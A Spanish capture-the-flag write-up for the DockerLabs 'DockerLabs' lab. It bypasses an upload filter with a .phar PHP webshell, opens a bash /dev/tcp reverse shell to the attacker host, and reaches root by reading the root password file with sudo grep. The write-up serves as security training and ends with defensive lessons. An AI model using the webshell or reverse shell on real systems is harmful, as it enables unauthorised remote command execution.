---
title: "DockerLabs - DockerLabs"
difficulty: "Fácil"
source: "DockerLabs"
---

Laboratorio sobre seguridad en contenedores Docker. Intrusión via file upload con bypass de extensión (.phar) y escalada a root mediante lectura de archivos como root con sudo grep/cut.

## Despliegue

```bash
bash auto_deploy.sh dockerlabs.tar
```

## Reconocimiento

```bash
nmap -sCV -p- 172.17.0.2
```

Puerto detectado:
- **80/tcp** — HTTP (Apache)

## Enumeración web

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 50
```

Directorios/archivos encontrados:
- `/uploads/` — directorio de subidas (vacío inicialmente)
- `/upload.php` — endpoint de subida
- `/machine.php` — panel de subida de laboratorios

La página principal (`index.php`) simula la plataforma DockerLabs con botones de descarga, subida y copia para cada laboratorio.

## Intrusión — File Upload Bypass (.phar)

`machine.php` contiene un formulario que solo acepta archivos `.zip`. El filtro de extensiones se puede bypassear usando `.phar`:

```bash
# Crear webshell
echo '<?php system($_GET["cmd"]); ?>' > shell.phar

# Subir via curl
curl -s -X POST http://172.17.0.2/upload.php -F "file=@shell.phar"

# Verificar RCE
curl -s "http://172.17.0.2/uploads/shell.phar?cmd=id"
# www-data
```

Reverse shell (listener en 4444):

```
http://172.17.0.2/uploads/shell.phar?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/172.17.0.1/4444+0>%261'
```

Acceso como **www-data**.

## Escalada — www-data → root

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/grep
# (root) NOPASSWD: /usr/bin/cut
```

`grep` y `cut` con sudo permiten leer cualquier archivo del sistema como root.

Pista en `/opt/nota.txt`:

```bash
sudo grep '' /opt/nota.txt
# Protege la clave de root, se encuentra en su directorio /root/clave.txt, menos mal que nadie tiene permisos para acceder a ella.
```

Leer el archivo de root:

```bash
sudo grep '' /root/clave.txt
# dockerlabsmolamogollon123
```

Escalar a root:

```bash
su root
# password: dockerlabsmolamogollon123
whoami
# root
```

## Conclusión

Cadena de ataque completa:

1. **Reconocimiento** — nmap detecta puerto 80
2. **Enumeración** — gobuster encuentra /uploads/, upload.php y machine.php
3. **File upload bypass** — filtro de extensiones bypasseable con .phar
4. **RCE** — webshell en /uploads/shell.phar → reverse shell como www-data
5. **Lectura como root** — sudo grep/cut permiten leer cualquier fichero
6. **Credential leakage** — /opt/nota.txt pista → /root/*.txt contiene password
7. **su root** → acceso total

**Lecciones aprendidas:**
- Los filtros de extensión en file uploads deben validar tanto extensión como Content-Type y magic bytes.
- `.phar` es una extensión PHP ejecutable frecuentemente olvidada en listas negras.
- `grep` y `cut` con sudo sin restricciones equivalen a lectura arbitraria de ficheros como root — suficiente para comprometer el sistema.
